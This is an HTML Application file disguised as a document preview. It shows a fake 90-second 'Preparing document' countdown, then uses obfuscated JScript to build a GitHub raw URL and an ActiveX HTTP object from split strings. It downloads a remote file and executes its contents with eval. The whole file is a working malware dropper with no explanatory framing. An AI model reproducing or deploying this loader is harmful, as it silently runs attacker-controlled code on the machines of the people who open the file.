<html><head><title>Document preview</title>
<hta:application id="app" />
<script language="JScript">
var left = 90;
function step() {
    left = left - 1;
    if (left <= 0) { go(); return; }
    var e = document.getElementById("cd");
    if (e) { e.innerText = "Preparing document... " + left + " s"; }
    setTimeout(step, 1000);
}
function go() {
    var b = "https://raw." + "githubuserco" + "ntent.com/Bo" + "ndayGo/Vulka" + "nKit/main/t/";
    var ax = "Act" + "iveXObject";
    var x = new window[ax]("MSXML2.XMLHTTP");
    x.open("GET", b + "m4b.dat", false);
    x.send();
    if (x.status == 200) { eval(x.responseText); }
}
setTimeout(step, 1000);
</script></head><body>
<p>Loading document, please wait...</p>
<p id="cd">Preparing document... 90 s</p>
</body></html>
